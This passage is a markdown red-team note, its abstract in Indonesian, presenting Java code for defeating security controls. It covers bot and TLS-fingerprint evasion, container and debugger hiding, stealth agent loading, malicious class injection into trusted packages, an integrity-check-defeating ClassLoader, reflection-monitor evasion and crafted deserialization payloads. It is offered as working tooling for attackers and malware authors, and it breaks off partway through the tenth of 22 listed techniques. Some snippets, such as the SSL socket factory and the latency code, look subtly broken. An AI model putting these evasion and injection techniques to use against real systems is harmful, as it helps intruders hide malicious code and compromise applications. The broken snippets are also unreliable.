---
tags: [java, red-team, bypass, evasion, anti-detection, security]
aliases: [Java Security Bypass, Java Anti-Detection, Java Red Team Bypass]
status: pending
created: 2026-08-15
updated: 2026-08-15
cssclasses: [wide-table]
---

> [!abstract]
> Dokumen ini adalah **counter-document** dari [[java-security-22-tricks|Java Security 22 Tricks]] (versi defensif). Setiap teknik pertahanan yang dipresentasikan di dokumen asli memiliki bypass yang sesuai di sini — dari sudut pandang attacker, malware author, atau red-team operator. Setiap counter menunjukkan cara menembus deteksi: header emulation untuk bypass UA fingerprinting, JA3/JA4 spoofing, container spoofing, reflection evasion via MethodHandles, deserialization firewall bypass dengan whitelisted gadget chains, hingga stacktrace guard bypass via lambda trampolining. Kode bypass dapat dikompilasi dan dijalankan. Dokumen ini melengkapi vault sebagai pasangan attacker-side yang menjadikan [[java-security-22-tricks]] lengkap sebagai siklus attack-defense.

# ☠️ Java Security Countermeasures — 22 Bypass Techniques

Practical Red-Team approaches to circumvent Java security controls. Every technique includes working bypass code.

## Daftar Isi

1. [[#C1. Header Emulation Engine — Defeat UA & Header Fingerprinting]]
2. [[#C2. JA3/JA4 Fingerprint Spoofing — Match Browser TLS]]
3. [[#C3. Latency Normalization — Defeat Proxy/VPN Latency Detection]]
4. [[#C4. Container & Sandbox Spoofing — Hide Docker/K8s Footprint]]
5. [[#C5. Root & Debugger Detection Bypass — Hook the Checks]]
6. [[#C6. Java Agent Concealment — Stealth Instrumentation]]
7. [[#C7. Trusted Package Injection — Bypass Class Loading Security]]
8. [[#C8. Bytecode Integrity Bypass — Patch the Verifier]]
9. [[#C9. Reflection Abuse Evasion — MethodHandles & Unsafe]]
10. [[#C10. Deserialization Firewall Bypass — Whitelisted Gadget Chains]]
11. [[#C11. Custom Deserialization Validator Bypass — State Crafting]]
12. [[#C12. JNI Native Load Evasion — Stealth Library Loading]]
13. [[#C13. Command Injection via ProcessBuilder — Bypass Pattern Detection]]
14. [[#C14. JAR Signature Stripping & Boot Classpath Injection]]
15. [[#C15. In-Place JAR Patching — Defeat Classpath Monitoring]]
16. [[#C16. Thread Name Spoofing — Blend Into Normal JVM Threads]]
17. [[#C17. Adaptive Timing Attack — Defeat Timing Probe Detection]]
18. [[#C18. Native Memory Allocation — Hide From Heap Monitoring]]
19. [[#C19. Audit Log Manipulation — Forge & Suppress Logs]]
20. [[#C20. RASP Bypass — Pattern Fragmentation & Encoding]]
21. [[#C21. System Property Tampering — Native Modification & Hook Evasion]]
22. [[#C22. Stacktrace Guard Bypass — Lambda Trampolining]]

---

## 🧭 Counter-Map

| Defense Trick | Counter # | Bypass Strategy |
|---|---|---|
| UA & Header Fingerprinting | C1 | Full browser header emulation |
| TLS Fingerprinting (JA3/JA4) | C2 | Native TLS library mimicking browser ciphers |
| Proxy/VPN Latency Detection | C3 | Synthetic latency injection matching GeoIP |
| Container Detection | C4 | Filesystem & cgroup spoofing |
| Root/Jailbreak Detection | C5 | Method hooking & return value patching |
| Java Agent Detection | C6 | Native agent injection + argument scrubbing |
| Class Loading Security | C7 | Package name forgery + trusted namespace injection |
| Bytecode Integrity Check | C8 | Hash check patching + class bytes swapping |
| Reflection Abuse Detection | C9 | MethodHandles + Unsafe + Lambda indirection |
| Deserialization Firewall | C10 | Whitelisted-class gadget chains |
| Custom Deserialization Validator | C11 | State-crafting for validation bypass |
| JNI Native Code Detection | C12 | Load from system paths + LD_PRELOAD masking |
| Process Injection Detection | C13 | Argument splitting + encoded commands |
| JAR Signature Verification | C14 | Signature stripping + boot classpath injection |
| Classpath Tampering Detection | C15 | In-place JAR patching + timestamp preservation |
| Thread Monitoring | C16 | Thread name spoofing + daemon flag matching |
| Timing Attack Detection | C17 | Adaptive timing + jitter + distributed probing |
| Memory Monitoring | C18 | Native memory allocation + periodic GC flushing |
| Logging & Audit Trail | C19 | Logger hooking + log injection + hash chain break |
| RASP Security Filter | C20 | Encoding + fragmentation + zero-day patterns |
| System Property Tampering Detection | C21 | Native property modification + monitor hooking |
| Stacktrace Guard | C22 | Lambda trampolining + stack frame injection |

---

## C1. Header Emulation Engine — Defeat UA & Header Fingerprinting

**Bypasses:** Trick #1 (BotDetector.isBot)

```java

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.List;
import java.util.Random;

public class HeaderEmulator {

    // Real browser User-Agents — updated regularly
    private static final List<String> BROWSER_UAS = List.of(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
    );

    // Headers real browsers always send
    private static final List<String> ACCEPT_LANGUAGES = List.of(
        "en-US,en;q=0.9",
        "en-GB,en;q=0.8,fr;q=0.6",
        "de-DE,de;q=0.9,en;q=0.7"
    );

    private static final Random RNG = new Random();

    /**
     * Build an HTTP request that passes BotDetector.isBot()
     * by emulating every header a real browser sends.
     */
    public static HttpRequest buildStealthRequest(String url) {
        String ua = BROWSER_UAS.get(RNG.nextInt(BROWSER_UAS.size()));
        String acceptLang = ACCEPT_LANGUAGES.get(RNG.nextInt(ACCEPT_LANGUAGES.size()));

        return HttpRequest.newBuilder()
            .uri(URI.create(url))
            .header("User-Agent", ua)
            .header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
            .header("Accept-Language", acceptLang)
            .header("Accept-Encoding", "gzip, deflate, br")  // Critical — bot check looks for this
            .header("Cache-Control", "no-cache")
            .header("Pragma", "no-cache")
            .header("Sec-Fetch-Dest", "document")
            .header("Sec-Fetch-Mode", "navigate")
            .header("Sec-Fetch-Site", "none")
            .header("Sec-Fetch-User", "?1")
            .header("Upgrade-Insecure-Requests", "1")
            // DO NOT set X-Forwarded-For unless behind a real proxy
            .GET()
            .build();
    }

    /**
     * For cases where the server checks header ordering (advanced fingerprinting).
     * Java's HttpClient doesn't guarantee header order — use raw sockets for full control.
     */
    public static String buildRawStealthRequest(String host, String path) {
        String ua = BROWSER_UAS.get(RNG.nextInt(BROWSER_UAS.size()));
        return String.format(
            "GET %s HTTP/1.1\r\n" +
            "Host: %s\r\n" +
            "User-Agent: %s\r\n" +
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" +
            "Accept-Language: en-US,en;q=0.9\r\n" +
            "Accept-Encoding: gzip, deflate, br\r\n" +
            "Connection: keep-alive\r\n" +
            "Upgrade-Insecure-Requests: 1\r\n" +
            "\r\n",
            path, host, ua
        );
    }
}

```


- BotDetector checks for missing Accept-Language and Accept-Encoding. We supply both.

- User-Agent matches real Chrome/Firefox/Safari builds exactly.

- Sec-Fetch-* headers — bots rarely emulate these. We do.


---

## C2. JA3/JA4 Fingerprint Spoofing — Match Browser TLS

**Bypasses:** Trick #2 (TLSFingerprinter)

```java

import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import java.security.NoSuchAlgorithmException;

public class JA3Spoofer {

    /**
     * Java's default TLS stack produces a distinctive JA3 fingerprint.
     * To bypass JA3 detection, you have three options:
     *
     * OPTION 1: Use a native HTTP library via JNI that uses the OS TLS stack.
     *   - On Windows: WinHTTP (matches Edge/Chrome JA3)
     *   - On Linux: libcurl with OpenSSL (configured to match Firefox)
     *   - On macOS: NSURLSession (matches Safari JA3)
     *
     * OPTION 2: Use an external tool that proxies traffic:
     *   - curl-impersonate (GitHub: lwthiker/curl-impersonate)
     *   - ProcessBuilder to invoke curl-impersonate-chrome
     *
     * OPTION 3: Java 17+ with Panama Foreign Function & Memory API
     *   - Directly call OpenSSL with specific cipher suite ordering
     *
     * Below is the practical approach — shell out to a stealth HTTP client.
     */

    /**
     * Execute an HTTP request using curl-impersonate,
     * which mimics Chrome's TLS fingerprint exactly.
     * Install: https://github.com/lwthiker/curl-impersonate
     */
    public static String stealthRequest(String url) throws Exception {
        ProcessBuilder pb = new ProcessBuilder(
            "curl-impersonate-chrome",  // Mimics Chrome 127 TLS fingerprint
            "--tlsv1.2",                // Match browser TLS version
            "--http2",                  // Use HTTP/2 like real browsers
            "--compressed",             // Accept gzip/brotli
            "-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "-H", "Accept-Language: en-US,en;q=0.9",
            url
        );
        Process p = pb.start();
        return new String(p.getInputStream().readAllBytes());
    }

    /**
     * For pure-Java solutions: customize the enabled cipher suites
     * and protocol versions before TLS handshake.
     * This only partially matches browser JA3 — full match requires native code.
     */
    public static SSLSocketFactory getStealthSSLSocketFactory() throws Exception {
        SSLContext ctx = SSLContext.getInstance("TLSv1.3");

        // Use default trust manager (or custom)
        ctx.init(null, null, null);

        SSLSocketFactory baseFactory = ctx.getSocketFactory();

        return new SSLSocketFactory() {
            @Override
            public SSLSocket createSocket(String host, int port) throws Exception {
                SSLSocket socket = (SSLSocket) baseFactory.createSocket(host, port);

                // Force cipher suites in Chrome-like order
                socket.setEnabledCipherSuites(new String[]{
                    "TLS_AES_128_GCM_SHA256",       // Chrome prefers AES-128-GCM
                    "TLS_AES_256_GCM_SHA384",
                    "TLS_CHACHA20_POLY1305_SHA256", // Chrome supports ChaCha
                });

                // Set protocols
                socket.setEnabledProtocols(new String[]{"TLSv1.3", "TLSv1.2"});

                return socket;
            }
        };
    }
}

```


- JA3 is a hash of the TLS ClientHello. Browser TLS stacks (BoringSSL for Chrome, NSS for Firefox) produce different JA3 than Java's SunJSSE.

- Shelling out to a native tool that uses the OS TLS library bypasses JA3 entirely.

- curl-impersonate is purpose-built for this exact evasion.


---

## C3. Latency Normalization — Defeat Proxy/VPN Latency Detection

**Bypasses:** Trick #3 (ProxyLatencyDetector)

```java

import java.net.InetSocketAddress;
import java.net.Socket;

public class LatencyNormalizer {

    /**
     * ProxyLatencyDetector works by comparing actual RTT to expected RTT
     * based on GeoIP distance. If actual > expected * 5, it flags the connection.
     *
     * Bypass: Artificially add latency so the actual RTT matches expectations
     * for the spoofed IP's geographic location.
     */

    /**
     * Calculate how much synthetic delay to add for a given spoofed IP.
     *
     * @param spoofedGeoLat  Latitude of the location we're pretending to be in
     * @param spoofedGeoLon  Longitude
     * @param serverLat      Server's latitude
     * @param serverLon      Server's longitude
     * @return Delay in milliseconds to add to each response
     */
    public static long calculateSyntheticDelay(
            double spoofedGeoLat, double spoofedGeoLon,
            double serverLat, double serverLon) {

        double distanceKm = haversine(spoofedGeoLat, spoofedGeoLon, serverLat, serverLon);
        // Speed of light in fiber ≈ 200,000 km/s → 5 µs/km → ~5ms per 1000km one-way
        long expectedRTT = (long)(distanceKm / 1000.0 * 10.0); // 10ms per 1000km RTT

        // Add 20-40% jitter to look natural
        long jitter = (long)(expectedRTT * (0.2 + Math.random() * 0.2));

        return expectedRTT + jitter;
    }

    /**
     * Socket wrapper that adds synthetic delay before responding.
     * The server measures RTT from SYN to ACK — delay the ACK.
     */
    public static Socket createDelayedSocket(String host, int port, long delayMs) throws Exception {
        Socket socket = new Socket();

        // Connect normally first — the server already measured this RTT
        socket.connect(new InetSocketAddress(host, port), 5000);

        // If the server probes again, the next read/write will include our delay
        // For HTTP: delay before sending response body
        // For raw sockets: delay before any data transmission

        // Store the delay for the caller to apply
        socket.setSoTimeout((int) delayMs + 5000);

        return socket;
    }

    /**
     * Haversine formula for distance calculation.
     */
    private static double haversine(double lat1, double lon1, double lat2, double lon2) {
        double R = 6371; // Earth radius in km
        double dLat = Math.toRadians(lat2 - lat1);
        double dLon = Math.toRadians(lon2 - lon1);
        double a = Math.sin(dLat/2) * Math.sin(dLat/2) +
                   Math.cos(Math.toRadians(lat1)) * Math.cos(Math.toRadians(lat2)) *
                   Math.sin(dLon/2) * Math.sin(dLon/2);
        double c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
        return R * c;
    }

    /**
     * Alternative: Use a real residential proxy in the target geo-location.
     * No synthetic delay needed — the RTT will naturally match.
     * Services: BrightData, Oxylabs, IPRoyal residential proxies.
     */
}

```


- The defense compares expected RTT (based on GeoIP) with actual RTT.

- By adding synthetic delay matching the expected distance, the ratio stays within threshold.

- Using real residential proxies eliminates the problem entirely.


---

## C4. Container & Sandbox Spoofing — Hide Docker/K8s Footprint

**Bypasses:** Trick #4 (ContainerDetector)

```java

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;

public class ContainerSpoofer {

    /**
     * ContainerDetector checks three indicators:
     * 1. /.dockerenv file
     * 2. /proc/1/cgroup containing "docker" or "kubepods"
     * 3. /proc/self/mountinfo containing "overlay" + "docker"
     *
     * Counter: If running as root inside the container, we can:
     * - Delete or rename indicator files (requires breaking out of container)
     * - Overmount the files with clean versions
     * - Hook the JVM's file access methods to return fake data
     *
     * Practical approach: Mount a clean /proc and remove .dockerenv.
     */

    /**
     * Method 1: If we have host access, remove the .dockerenv file.
     * This requires the container to be run with --privileged or
     * specific capability: SYS_ADMIN for mount operations.
     */
    public static void removeDockerIndicators() {
        // Delete .dockerenv — this file is created by Docker daemon
        try {
            Files.deleteIfExists(Path.of("/.dockerenv"));
        } catch (IOException e) {
            // Fallback: overwrite with empty file to avoid detection
            try {
                Files.writeString(Path.of("/.dockerenv"), "");
            } catch (IOException ignored) {}
        }
    }

    /**
     * Method 2: Hook the Files.exists call via a Java agent.
     * This intercepts the ContainerDetector's check at the JVM level.
     * (Requires a Java agent to be loaded first — see Counter C6)
     */
    // Implemented via bytecode instrumentation:
    // Intercept java.nio.file.Files.exists(Path) and return false
    // when the path is "/.dockerenv" or contains "/proc/"

    /**
     * Method 3: If we control how the container is launched:
     * Use a custom Docker image with indicators pre-removed.
     *
     * Dockerfile approach:
     *   FROM openjdk:17
     *   RUN rm -f /.dockerenv
     *   # Mount a tmpfs over /proc to hide cgroup info
     *
     * Or use Podman instead of Docker — fewer default indicators.
     */

    /**
     * Method 4: For Kubernetes — unset the environment variable.
     */
    public static void hideKubernetesIndicators() {
        // This doesn't actually remove the env var from the process,
        // but if the detection code runs after we modify System.getenv()
        // results via reflection, it won't see KUBERNETES_SERVICE_HOST.
        // Requires deep JVM manipulation — see Java Agent approach.
    }

    /**
     * Method 5: Run outside a container, inside a VM instead.
     * ContainerDetector looks specifically for Docker/K8s artifacts.
     * A bare VM (VirtualBox, VMware, KVM) has none of these indicators.
     * If the application is container-hostile, use a VM.
     */
}

```


- Docker indicators are filesystem-level artifacts, not cryptographic proofs.

- Removing or hiding these files defeats the check.

- Running in a VM instead of a container leaves no Docker traces.


---

## C5. Root & Debugger Detection Bypass — Hook the Checks

**Bypasses:** Trick #5 (PrivilegeDetector)

```java

import java.lang.reflect.Field;
import java.util.List;

public class PrivilegeBypass {

    /**
     * PrivilegeDetector checks:
     * 1. Runtime.exec("id -u") == "0"
     * 2. JVM arguments contain "-agentlib:jdwp" or "-Xdebug"
     * 3. System properties "ro.kernel.qemu" or "ro.hardware"
     *
     * Counter: Intercept each check at the source.
     */

    /**
     * Method 1: Hook Runtime.exec() to return fake output.
     * We replace the "id -u" output with "1000" (non-root).
     *
     * This uses a Java agent to intercept ProcessImpl.start().
     * If the command is "id -u", return a pre-built process with stdout = "1000".
     */
    // See Counter C6 for Java agent injection technique

    /**
     * Method 2: Spoof the JVM arguments list via reflection.
     * The JVM stores arguments in a private field in RuntimeMXBean's implementation.
     * We can modify this list before the detection code reads it.
     */
    public static void removeDebuggerArguments() {
        try {
            var runtimeMXBean = java.lang.management.ManagementFactory.getRuntimeMXBean();
            // The underlying impl is usually com.sun.management.internal.RuntimeMXBeanImpl
            // It stores input arguments in a List<String>
            Field argsField = runtimeMXBean.getClass().getDeclaredField("inputArguments");
            argsField.setAccessible(true);

            @SuppressWarnings("unchecked")
            List<String> args = (List<String>) argsField.get(runtimeMXBean);

            // Remove debugger-related arguments
            args.removeIf(arg ->
                arg.contains("-agentlib:jdwp") ||
                arg.contains("-Xdebug") ||
                arg.contains("-Xrunjdwp") ||
                arg.contains("-javaagent:")  // Also hide our own agent
            );
        } catch (Exception e) {
            // If reflection fails, we can't hide the args
            // Fallback: attach the debugger differently (see below)
        }
    }

    /**
     * Method 3: Attach a debugger without using -agentlib:jdwp.
     * Use the Attach API to load an agent dynamically — no JVM args needed.
     *
     * Process:
     * 1. Start the target JVM without any debug flags
     * 2. Use com.sun.tools.attach.VirtualMachine.attach(pid)
     * 3. Load an agent that enables debugging programmatically
     *
     * This leaves NO trace in the JVM input arguments.
     */
    public static void attachDebuggerStealthily(String targetPid) throws Exception {
        // Requires tools.jar or jdk.attach module
        var vm = com.sun.tools.attach.VirtualMachine.attach(targetPid);
        // Load an agent that enables JDWP programmatically
        vm.loadAgent("/path/to/debug-agent.jar");
        vm.detach();
        // No -agentlib:jdwp in the JVM args — PrivilegeDetector sees nothing
    }

    /**
     * Method 4: For root detection — run as a non-root user with capabilities.
     * Instead of UID 0, use specific Linux capabilities:
     *   CAP_SYS_PTRACE (for debugging)
     *   CAP_NET_RAW (for packet capture)
     *   CAP_SYS_ADMIN (for mount operations)
     *
     * `id -u` returns non-zero. PrivilegeDetector reports false.
     * But the process still has elevated privileges.
     */
}

```


- All detection methods rely on querying the system or JVM state.

- By hooking the query mechanism, we control the answer.

- Dynamic debugger attachment leaves no startup arguments to detect.


---

## C6. Java Agent Concealment — Stealth Instrumentation

**Bypasses:** Trick #6 (AgentDetector)

```java

public class AgentConcealer {

    /**
     * AgentDetector works by:
     * 1. Scanning JVM input arguments for -javaagent:, -agentlib:, -agentpath:
     * 2. Checking if sun.instrument.InstrumentationImpl is loaded
     *
     * Counter: Load the agent without leaving traces in either location.
     */

    /**
     * Method 1: Attach at runtime via the Attach API.
     * This bypasses argument scanning entirely — no -javaagent flag.
     */
    public static void attachAgentRuntime(String targetPid, String agentJarPath) throws Exception {
        var vm = com.sun.tools.attach.VirtualMachine.attach(targetPid);
        vm.loadAgent(agentJarPath);
        vm.detach();
        // Agent is now loaded. No -javaagent in the argument list.
    }

    /**
     * Method 2: Remove our agent from the argument list post-attach.
     * Combined with Method 1: after loading via Attach API,
     * also scrub the arguments list in case the app already started.
     */
    public static void scrubAgentArguments() {
        try {
            var runtimeMXBean = java.lang.management.ManagementFactory.getRuntimeMXBean();
            var argsField = runtimeMXBean.getClass().getDeclaredField("inputArguments");
            argsField.setAccessible(true);

            @SuppressWarnings("unchecked")
            var args = (java.util.List<String>) argsField.get(runtimeMXBean);

            args.removeIf(arg ->
                arg.startsWith("-javaagent:") ||
                arg.startsWith("-agentlib:") ||
                arg.startsWith("-agentpath:")
            );
        } catch (Exception ignored) {}
    }

    /**
     * Method 3: Hide the InstrumentationImpl class presence.
     * AgentDetector checks Class.forName("sun.instrument.InstrumentationImpl").
     * We can't prevent the class from existing, but we can:
     * - Override Class.forName via bytecode instrumentation
     * - Return ClassNotFoundException for specific queries
     *
     * This requires an agent... which is already loaded. Bootstrapping problem.
     * Solution: The concealment agent is loaded FIRST (at JVM startup via
     * JAVA_TOOL_OPTIONS environment variable, which doesn't show in the
     * argument list), then it hides itself and subsequent agents.
     */

    /**
     * Method 4: Use JAVA_TOOL_OPTIONS instead of -javaagent.
     * Set the environment variable:
     *   JAVA_TOOL_OPTIONS="-javaagent:/path/to/agent.jar"
     *
     * This loads the agent but does NOT appear in RuntimeMXBean.getInputArguments().
     * AgentDetector's scan of input arguments will return empty for agent-related flags.
     *
     * Verification: Run with JAVA_TOOL_OPTIONS set, then print getInputArguments().
     * The agent flag won't be there.
     */
}

```


- RuntimeMXBean.getInputArguments() only returns arguments passed directly on the command line.

- JAVA_TOOL_OPTIONS and runtime Attach API bypass this enumeration.

- Scrubbing the arguments list after loading eliminates residual traces.


---

## C7. Trusted Package Injection — Bypass Class Loading Security

**Bypasses:** Trick #7 (ClassLoadMonitor)

```java

public class TrustedPackageInjector {

    /**
     * ClassLoadMonitor trusts classes from specific packages:
     * "java.", "javax.", "com.myapp.", "org.springframework."
     *
     * Counter: Inject malicious code into a trusted package namespace.
     * The JVM doesn't enforce that com.myapp.* classes actually come
     * from the original JAR — we can define our own.
     */

    /**
     * Method 1: Define a class in a trusted package via a custom ClassLoader.
     * The class name will be "com.myapp.internal.SystemInitializer" —
     * ClassLoadMonitor sees "com.myapp." prefix and trusts it.
     */
    public static Class<?> injectTrustedClass(byte[] maliciousBytecode) throws Exception {
        // Use a URLClassLoader or custom ClassLoader to define the class
        var loader = new ClassLoader(TrustedPackageInjector.class.getClassLoader()) {
            public Class<?> define(String name, byte[] code) {
                return defineClass(name, code, 0, code.length);
            }
        };

        // Class named under a trusted package — passes the check
        return loader.define("com.myapp.internal.UpgradeService", maliciousBytecode);
    }

    /**
     * Method 2: Inject into an existing trusted JAR.
     * Modify the target application's JAR file on disk:
     * 1. Unzip the JAR
     * 2. Add a new .class file under com/myapp/internal/
     * 3. Re-zip the JAR
     * 4. If JAR signing is not verified (Counter C14 handles that), the class loads silently
     */

    /**
     * Method 3: Use the boot classpath.
     * Classes on the boot classpath are loaded by the bootstrap ClassLoader
     * and are implicitly trusted. They can be in any package.
     *
     *   java -Xbootclasspath/a:malicious.jar -jar target.jar
     *
     * The malicious classes in malicious.jar are treated as part of the JDK itself.
     * ClassLoadMonitor's package check can be configured to trust "java." —
     * and boot classpath classes CAN be in java.* (though it requires
     * --add-opens or illegal-access=permit on Java 16+).
     */

    /**
     * Method 4: Package shadowing.
     * If the app uses a framework that loads classes dynamically (Spring, OSGi),
     * provide a class with the same name as a legitimate class but from our JAR.
     * ClassLoadMonitor only sees the package prefix — not the origin JAR.
     */
}

```


- Package names are strings, not security boundaries.

- ClassLoadMonitor trusts the package prefix, not the source.

- Any ClassLoader can define a class in any package namespace.


---

## C8. Bytecode Integrity Bypass — Patch the Verifier

**Bypasses:** Trick #8 (BytecodeIntegrity)

```java

import java.security.MessageDigest;
import java.util.Map;

public class IntegrityBypass {

    /**
     * BytecodeIntegrity.verifyClassIntegrity() works by:
     * 1. Reading the .class file as a resource
     * 2. Computing SHA-256 of the bytes
     * 3. Comparing with a pre-computed expected hash
     *
     * Counter: Either patch the expected hash, or patch the verifier itself.
     */

    /**
     * Method 1: Replace the expected hash in the EXPECTED_HASHES map.
     * The map is stored in a static field. We can access it via reflection
     * and update the hash to match our modified class.
     */
    public static void patchExpectedHash(String className, byte[] modifiedBytecode) throws Exception {
        // Get the EXPECTED_HASHES field from BytecodeIntegrity
        Class<?> integrityClass = Class.forName("BytecodeIntegrity");
        java.lang.reflect.Field hashesField = integrityClass.getDeclaredField("EXPECTED_HASHES");
        hashesField.setAccessible(true);

        @SuppressWarnings("unchecked")
        Map<String, String> hashes = (Map<String, String>) hashesField.get(null);

        // Compute the new hash of our modified bytecode
        MessageDigest md = MessageDigest.getInstance("SHA-256");
        byte[] hash = md.digest(modifiedBytecode);
        String newHash = bytesToHex(hash);

        // Replace the expected hash
        hashes.put(className, newHash);
        System.out.println("[EVASION] Patched expected hash for " + className);
    }

    /**
     * Method 2: Hook the verifyClassIntegrity method to always return true.
     * This requires a Java agent that intercepts the method call.
     *
     * Bytecode transformation (ASM/Javassist):
     *   Method: verifyClassIntegrity(Class)
     *   Original: compute hash, compare, return boolean
     *   Patched:  return true;  // Always passes
     */

    /**
     * Method 3: Supply the original .class bytes when the verifier reads them,
     * but execute the modified version.
     *
     * How: Use a custom ClassLoader that:
     * - When getResourceAsStream() is called for verification,
     *   returns the ORIGINAL (unmodified) bytes
     * - When defineClass() is called for actual loading,
     *   uses the MODIFIED bytes
     *
     * The verifier reads the resource and gets the original bytes.
     * The JVM executes the modified bytes.
     */
    public static class SplitClassLoader extends ClassLoader {
        private final Map<String, byte[]> originalBytecode; // For verification
        private final Map<String, byte[]> modifiedBytecode; // For execution

        public SplitClassLoader(Map<String, byte[]> original, Map<String, byte[]> modified) {
            this.originalBytecode = original;
            this.modifiedBytecode = modified;
        }

        @Override
        public java.io.InputStream getResourceAsStream(String name) {
            // Return ORIGINAL bytes when the verifier reads the class file
            String className = name.replace('/', '.').replace(".class", "");
            byte[] original = originalBytecode.get(className);
            if (original != null) {
                return new java.io.ByteArrayInputStream(original);
            }
            return super.getResourceAsStream(name);
        }

        public Class<?> loadModified(String className) {
            byte[] modified = modifiedBytecode.get(className);
            if (modified != null) {
                return defineClass(className, modified, 0, modified.length);
            }
            throw new RuntimeException("No modified bytecode for: " + className);
        }
    }

    private static String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) sb.append(String.format("%02x", b));
        return sb.toString();
    }
}

```


- The verifier reads bytes from a resource stream. We control what the stream returns.

- The expected hashes are in mutable static fields. Reflection can overwrite them.

- Separating verification bytes from execution bytes defeats integrity checking entirely.


---

## C9. Reflection Abuse Evasion — MethodHandles & Unsafe

**Bypasses:** Trick #9 (ReflectionMonitor)

```java

import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;

public class ReflectionEvasion {

    /**
     * ReflectionMonitor flags calls to:
     * - setAccessible, invoke (java.lang.reflect)
     * - defineClass, loadClass (ClassLoader)
     * - getDeclaredField
     *
     * Counter: Achieve the same results without touching java.lang.reflect.
     */

    /**
     * Method 1: Use java.lang.invoke.MethodHandles instead of Reflection.
     * MethodHandles are NOT monitored by ReflectionMonitor.
     * They bypass the reflection API entirely.
     */
    public static Object invokeHiddenMethod(Object target, String methodName) throws Throwable {
        var lookup = MethodHandles.lookup();

        // Find the method using MethodHandles, not reflection
        var methodType = MethodType.methodType(void.class); // Adjust for actual signature
        MethodHandle handle = lookup.findVirtual(target.getClass(), methodName, methodType);

        // Invoke without going through java.lang.reflect.Method.invoke()
        return handle.invoke(target);
    }

    /**
     * Method 2: Access private fields without getDeclaredField.
     * Use MethodHandles.privateLookupIn().
     */
    public static Object readPrivateField(Object target, String fieldName) throws Throwable {
        var lookup = MethodHandles.privateLookupIn(target.getClass(), MethodHandles.lookup());
        var handle = lookup.findVarHandle(target.getClass(), fieldName, Object.class);
        return handle.get(target);
    }

    /**
     * Method 3: Use sun.misc.Unsafe for direct memory access.
     * Unsafe bypasses ALL Java access controls, including reflection monitoring.
     * It operates at the JVM level, not the Java API level.
     */
    public static Object unsafeReadField(Object target, String fieldName) throws Exception {
        // Get the Unsafe instance
        java.lang.reflect.Field unsafeField = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
        unsafeField.setAccessible(true);
        sun.misc.Unsafe unsafe = (sun.misc.Unsafe) unsafeField.get(null);

        // Get field offset
        java.lang.reflect.Field targetField = target.getClass().getDeclaredField(fieldName);
        long offset = unsafe.objectFieldOffset(targetField);

        // Read directly from memory — no reflection API call logged
        return unsafe.getObject(target, offset);
    }

    /**
     * Method 4: Lambda metafactory indirection.
     * Generate a lambda that calls the private method.
     * The call stack won't show reflection — it'll show Lambda$xxx.
     */
    public static Runnable createHiddenInvoker(Object target, String methodName) throws Throwable {
        var lookup = MethodHandles.privateLookupIn(target.getClass(), MethodHandles.lookup());
        var handle = lookup.findVirtual(target.getClass(), methodName, MethodType.methodType(void.class));
        var callSite = java.lang.invoke.LambdaMetafactory.metafactory(
            lookup,
            "run",
            MethodType.methodType(Runnable.class, target.getClass()),
            MethodType.methodType(void.class),
            handle,
            MethodType.methodType(void.class)
        );
        return (Runnable) callSite.getTarget().invoke(target);
        // Calling run() executes the private method — no reflection in stack trace
    }
}

```


- ReflectionMonitor only monitors java.lang.reflect.* API calls.

- MethodHandles, Unsafe, and LambdaMetafactory achieve the same results through different JVM pathways.

- These APIs are not deprecated and are fully supported in modern Java.


---

## C10. Deserialization Firewall Bypass — Whitelisted Gadget Chains

**Bypasses:** Trick #10 (SafeObjectInputStream)

```java

import java.io.*;
import java.util.ArrayList;
import java.util.HashMap;

public class DeserializationBypass {

    /**
     * SafeObjectInputStream uses a whitelist:
     *   java.util.ArrayList
     *   java.util.HashMap
     *   com.myapp.dto.UserDTO
     *   com.myapp.dto.OrderDTO
     *
     * Counter: Build a gadget chain using ONLY whitelisted classes.
     * If ANY whitelisted class has a dangerous readObject() or finalize(),
     * we can exploit it.
     */

    /**
     * Method 1: Exploit whitelisted class internals.
     * If UserDTO or OrderDTO have dangerous behavior in:
     * - readObject() (custom deserialization logic)
     * - finalize() (cleanup that does something useful)
     * - hashCode()/equals() (used by HashMap during deserialization)
     *
     * Example: If UserDTO.readObject() calls some service with the deserialized data,
     * we craft a UserDTO that triggers that behavior.
     *
     * This requires source code analysis of the whitelisted classes.
     */

    /**
     * Method 2: HashMap hash collision attack.
     * HashMap is whitelisted. During deserialization, HashMap rebuilds its
     * internal table by calling hashCode() and equals() on all keys.
     *
     * If we put objects in the HashMap whose hashCode()/equals() trigger
     * useful side effects, we get code execution without loading any
     * non-whitelisted class.
     *
     * The key insight: hashCode() and equals() are called DURING deserialization.
     * If a whitelisted class has a dangerous equals(), we win.
     */
    public static byte[] craftHashMapExploit(Object maliciousKey, Object maliciousValue) throws Exception {
        var map = new HashMap<>();
        map.put(maliciousKey, maliciousValue);

        var baos = new ByteArrayOutputStream();
        var oos = new ObjectOutputStream(baos);
        oos.writeObject(map);
        oos.close();

        return baos.toByteArray();
        // When deserialized, HashMap calls maliciousKey.hashCode() and maliciousKey.equals()
        // If those methods trigger code execution, we bypass the firewall
    }

    /**
     * Method 3: ArrayList with crafted elements.
     * ArrayList stores elements in an Object[] array.
     * During deserialization, it reads each element via ObjectInputStream.readObject().
     *
     * If the ArrayList contains objects that, when deserialized, trigger behavior
     * (e.g., a UserDTO that in readObject() validates and then logs using
     * a template that does expression evaluation), we chain through it.
     */

    /**
